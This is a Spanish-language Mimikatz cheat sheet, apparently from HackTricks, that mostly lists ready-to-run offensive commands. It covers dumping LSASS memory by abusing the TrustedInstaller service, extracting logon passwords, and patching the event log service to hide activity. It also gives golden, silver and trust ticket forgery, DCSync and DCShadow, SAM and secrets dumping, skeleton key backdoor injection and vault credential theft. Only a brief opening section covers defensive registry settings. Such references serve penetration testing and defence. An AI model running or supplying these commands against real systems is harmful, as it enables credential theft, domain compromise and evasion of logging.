# Mimikatz

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres que tu **empresa sea anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta página está basada en una de [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. ¡Consulta el original para más información!

## LM y texto claro en memoria

A partir de Windows 8.1 y Windows Server 2012 R2, se han implementado medidas significativas para protegerse contra el robo de credenciales:

- Las **hashes LM y las contraseñas en texto claro** ya no se almacenan en la memoria para mejorar la seguridad. Se debe configurar un ajuste específico en el registro, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, con un valor DWORD de `0` para deshabilitar la Autenticación Digest, asegurando que las contraseñas en "texto claro" no se almacenen en LSASS.

- Se introduce la **Protección LSA** para proteger el proceso de Autoridad de Seguridad Local (LSA) contra la lectura no autorizada de memoria e inyección de código. Esto se logra marcando el LSASS como un proceso protegido. La activación de la Protección LSA implica:
1. Modificar el registro en _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ estableciendo `RunAsPPL` en `dword:00000001`.
2. Implementar un Objeto de Directiva de Grupo (GPO) que aplique este cambio de registro en los dispositivos gestionados.

A pesar de estas protecciones, herramientas como Mimikatz pueden eludir la Protección LSA utilizando controladores específicos, aunque es probable que tales acciones se registren en los registros de eventos.

### Contrarrestar la eliminación de SeDebugPrivilege

Normalmente, los administradores tienen SeDebugPrivilege, lo que les permite depurar programas. Este privilegio puede restringirse para evitar volcados de memoria no autorizados, una técnica común utilizada por atacantes para extraer credenciales de la memoria. Sin embargo, incluso con este privilegio eliminado, la cuenta TrustedInstaller aún puede realizar volcados de memoria utilizando una configuración de servicio personalizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Esto permite volcar la memoria de `lsass.exe` a un archivo, el cual luego puede ser analizado en otro sistema para extraer credenciales:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opciones de Mimikatz

El manipuleo de registros de eventos en Mimikatz implica dos acciones principales: borrar registros de eventos y parchear el servicio de Eventos para evitar el registro de nuevos eventos. A continuación se muestran los comandos para realizar estas acciones:

#### Borrado de Registros de Eventos

- **Comando**: Esta acción tiene como objetivo eliminar los registros de eventos, dificultando el seguimiento de actividades maliciosas.
- Mimikatz no proporciona un comando directo en su documentación estándar para borrar registros de eventos directamente a través de su línea de comandos. Sin embargo, la manipulación de registros de eventos generalmente implica el uso de herramientas del sistema o scripts fuera de Mimikatz para borrar registros específicos (por ejemplo, usando PowerShell o el Visor de Eventos de Windows).

#### Función Experimental: Parchear el Servicio de Eventos

- **Comando**: `event::drop`
- Este comando experimental está diseñado para modificar el comportamiento del Servicio de Registro de Eventos, evitando efectivamente que registre nuevos eventos.
- Ejemplo: `mimikatz "privilege::debug" "event::drop" exit`

- El comando `privilege::debug` asegura que Mimikatz opere con los privilegios necesarios para modificar los servicios del sistema.
- Luego, el comando `event::drop` parchea el servicio de Registro de Eventos.


### Ataques de Tickets Kerberos

### Creación de Golden Ticket

Un Golden Ticket permite la suplantación de acceso a nivel de dominio. Comando clave y parámetros:

- Comando: `kerberos::golden`
- Parámetros:
- `/domain`: El nombre de dominio.
- `/sid`: El Identificador de Seguridad (SID) del dominio.
- `/user`: El nombre de usuario a suplantar.
- `/krbtgt`: El hash NTLM de la cuenta de servicio KDC del dominio.
- `/ptt`: Inyecta directamente el ticket en la memoria.
- `/ticket`: Guarda el ticket para uso posterior.

Ejemplo:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Creación de Ticket de Plata

Los Tickets de Plata otorgan acceso a servicios específicos. Comando clave y parámetros:

- Comando: Similar al Golden Ticket pero se dirige a servicios específicos.
- Parámetros:
- `/service`: El servicio a atacar (por ejemplo, cifs, http).
- Otros parámetros similares al Golden Ticket.

Ejemplo:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Creación de Trust Ticket

Los Trust Tickets se utilizan para acceder a recursos en diferentes dominios aprovechando las relaciones de confianza. Comando clave y parámetros:

- Comando: Similar al Golden Ticket pero para relaciones de confianza.
- Parámetros:
  - `/target`: El FQDN del dominio objetivo.
  - `/rc4`: El hash NTLM de la cuenta de confianza.

Ejemplo:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos adicionales de Kerberos

- **Listar tickets**:
- Comando: `kerberos::list`
- Lista todos los tickets de Kerberos para la sesión de usuario actual.

- **Pasar la caché**:
- Comando: `kerberos::ptc`
- Inyecta tickets de Kerberos desde archivos de caché.
- Ejemplo: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pasar el ticket**:
- Comando: `kerberos::ptt`
- Permite usar un ticket de Kerberos en otra sesión.
- Ejemplo: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Limpiar tickets**:
- Comando: `kerberos::purge`
- Borra todos los tickets de Kerberos de la sesión.
- Útil antes de usar comandos de manipulación de tickets para evitar conflictos.


### Manipulación de Active Directory

- **DCShadow**: Hacer temporalmente que una máquina actúe como un DC para la manipulación de objetos de AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imitar a un DC para solicitar datos de contraseñas.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Acceso a credenciales

- **LSADUMP::LSA**: Extraer credenciales de LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Suplantar a un DC usando los datos de contraseña de una cuenta de equipo.
- *No se proporciona un comando específico para NetSync en el contexto original.*

- **LSADUMP::SAM**: Acceder a la base de datos SAM local.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descifrar secretos almacenados en el registro.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Establecer un nuevo hash NTLM para un usuario.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recuperar información de autenticación de confianza.
- `mimikatz "lsadump::trust" exit`

### Varios

- **MISC::Skeleton**: Inyectar una puerta trasera en LSASS en un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Escalada de privilegios

- **PRIVILEGE::Backup**: Adquirir derechos de copia de seguridad.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtener privilegios de depuración.
- `mimikatz "privilege::debug" exit`

### Volcado de credenciales

- **SEKURLSA::LogonPasswords**: Mostrar credenciales de usuarios conectados.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extraer tickets de Kerberos de la memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulación de Sid y Token

- **SID::add/modify**: Cambiar SID y SIDHistory.
- Agregar: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modificar: *No se proporciona un comando específico para modificar en el contexto original.*

- **TOKEN::Elevate**: Suplantar tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Servicios de Terminal

- **TS::MultiRDP**: Permitir múltiples sesiones de RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Listar sesiones de TS/RDP.
- *No se proporciona un comando específico para TS::Sessions en el contexto original.*

### Bóveda

- Extraer contraseñas de Windows Vault.
- `mimikatz "vault::cred /patch" exit`
